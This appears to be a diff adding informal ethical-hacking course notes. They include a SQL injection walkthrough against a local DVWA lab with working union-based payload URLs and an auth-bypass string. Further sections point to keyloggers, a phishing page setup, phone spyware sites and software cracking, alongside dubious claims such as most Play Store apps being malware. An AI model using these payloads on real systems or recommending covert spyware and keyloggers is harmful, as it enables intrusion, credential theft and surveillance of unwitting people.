@@ -1,0 +1,227 @@
+Day 2 
+------
+Introduction to Web Application Hacking
+
+Website: Collection of pages known as website.
+
+Static Website : Website containing mainly pure HTML pages having no database attached to it, Hence mostly in readonly format.
+
+Dynamic Website : These websites carry many user input areas which are connected with thebackend database , from front end user enter values and in backend these inputs are getting stored.
+
+OSI Model ??
+
+Physical Layer
+Data Link Layer
+Network Layer
+TRansport Layer
+Session Layer
+Presentation Layer
+Application Layer
+
+OWASP Top 10 Attacks
+O Open
+W Web
+A Application
+S Security
+P Project
+
+www.owasp.org 
+https://www.owasp.org/index.php/Top_10_2013-Top_10
+
+
+Bypassing Authentication Attack
+--------------------------------
+
+username:admin
+password:hack
+     Login
+
+select * from users where username='admin' and password='hack';
+
+'or'1'='1
+
+Union Based Injection Attack  aka Advance SQL Injection
+-------------------------------------------------------
+SQL : Structured Query Language
+
+DDL 
+
+DML
+
+DCL
+
+Requirement
+-----------
+1. DVWA(Damn Vulnerable Web Application)
+Download : www.dvwa.co.uk
+2. XAMPP Server
+X Cross Platform
+A Apache
+M My-SQL
+P PHP
+P Perl
+
+Target : http://127.0.0.1/dvwa/vulnerabilities/sqli/
+
+Step 1: Find any GET Parameter in the URL of the website.
+GET METHOD : .php?id=10
+POST METHOD: .php
+http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#
+
+Step 2:Check the exception handling of URL.
+http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=1'&Submit=Submit#
+
+Step 3: Check the total number of columns from DDL in the URL.
+http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=1 &Submit=Submit#
+
+order by 4;
+id  name  last
+9
+2
+0
+35
+1
+
+Step 4: Dump the left hand side to right handside to put own inputs.
+http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=1 union select 1,2--+&Submit=Submit#
+
+Step 5: Check the database name and version.
+http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=1 union select database(),version()--+&Submit=Submit#
+
+Step 6: Get the tables name
+database->tables->table->columns->un and pass
+http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=1 union select 1,2--+&Submit=Submit#
+
+Schema : Database ki MAA.
+
+It holds the structure index of all the tables and the columns.
+
+Tables: information_schema.tables
+Columns: information_schema.columns
+
+http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=1 union select 1,table_name from information_schema.tables--+&Submit=Submit#
+
+Target Table Found by Agent 007: users
+
+Step 7: Get the columns of the users.
+http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=1 union select 1,column_name from information_schema.columns where table_name=char(117 ,115 ,101 ,114 ,115)--+&Submit=Submit#
+
+a = alpha
+a = char
+apple = word
+apple = string
+
+users??? --> string
+validation -->string
+
+string--> ASCII  ;)
+117 ,115 ,101 ,114 ,115
+
+Step 9: Get the username and password of the users table.
+http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=1 union select username,password from users--+&Submit=Submit#
+
+user:admin
+password:e99a18c428cb38d5f260853678922e03
+
+Email Hacking and Security
+--------------------------
+Email Accounts:
+
+Personal Email : officialrahultyagi@gmail.com
+
+Professsional : rahul.t@lucideustech.com
+
+1. Weak Passwords
+- Name : rahul
+- Contact number
+- college name
+- gf/bf name
+- puppy name
+- first book* you loved
+
+char : rahul
+num : 988778787
+special : r@Hu7
+Robust: *ig3simg*
+
+www.howsecureismypassword.net
+oncetherewasacrow
+
+
+
+1. Secret Questions
+2. Keyloggers
+Family Keylogger  :Local Keylogger
+Download:http://www.spyarsenal.com/familykeylogger/
+Ardamax Keylogger : Remote Keylogger
+www.hackforums.net
+3. Phishing
+1. Fake Gmail Page
+2. PHP File
+3. Logs.txt
+
+Wireless Hacking
+----------------
+WEP stands for Wired Equivalent Privacy. It is 802.11's first hardware form of security where the user and WAP are configured with an encryption key of either 64 bits or 128 bits in HEX. It works in this way that when the user attempts to authenticate, the AP issues a random challenge. The user then returns the challenge, encrypted with the key and the AP decrypts this challenge and if it matches the original the client is authenticated otherwise not. The problem with WEP is that the key is static, which is vulnerable, means by using some tools a hacker could use reverse-engineering to extract the encryption key. This process affects the transmission speed.
+
+WPA stands for WiFi Protected Access. It builds upon WEP, to make it more secure by adding extra security mechanism and algorithms to stop unauthorized access. WPA delivers a level of security way beyond anything that WEP can offer. WiFi compliance ensures interoperability between different manufacturer’s equipment. WPA bridges the gap between WEP and 802.11i networks, and has the advantage that the firmware in older equipment may be upgradeable. It's a new security standard adopted by the WiFi Alliance consortium.
+
+WPA2 is similar to WPA, except one thing that it add extra encryption called AES-CCMP. The primary difference between WPA and WPA2 is that WPA2 uses a more advanced encryption technique called AES (Advanced Encryption Standard), allowing for compliance with FIPS140-2 government security requirements. We prefer WPA2 because it has more than three protection levels, making it nearly impossible for computer guru hackers to break the encryption. AES is so good that it blocks statistical analysis of the cipher text. WPA2 is based upon the Institute for Electrical and Electronics Engineers’ (IEEE) 802.11i amendment to the 802.11 standard, which was modified on July 29, 2004. 
+
+
+1. Kali Linux 1.08 (Below 2.0 version)
+2. Basics of Linux (www.tinyurl.com/rahullinux)
+3. airmon-ng 
+4. airodump-ng
+5. aircrack-ng
+6. macchanger
+
+Wifi Adapter TP-Link : http://tinyurl.com/rahulwifi2016
+
+
+
+
+Smartphone Hacking and Security
+-------------------------------
+82% Global Mobiles are running on Android Platform.
+11% are iOS users
+rest.....
+
+90%  applications on Google Play Store are someway malwares.
+
+www.bossspy.com
+or
+mspy.com
+
+
+
+Cracking Softwares
+------------------
+High Level Lang. : ENGLISH , c C++ , java and so on.
+
+
+Middle Level Lang : Assembly lNag : .obj
+
+
+Low Level Lang : Binary : .exe
+
+Assembly lang is used for the reverse engineering process of any application.
+
+Engineering : 
+
+R.E : Registers, Flip Flops, Instructions and so on.
+
+ 4 Performing Registers 
+ EAX : Extended Accumulater Register
+ EBX : Base Register
+ ECX : Counter Register
+ EDX : Data Register
+
+ 2 iNdex registers
+ Source Index
+ Destination Index
+
+
+ Ollydbg
+ - Cheeta DVD burner Player
+
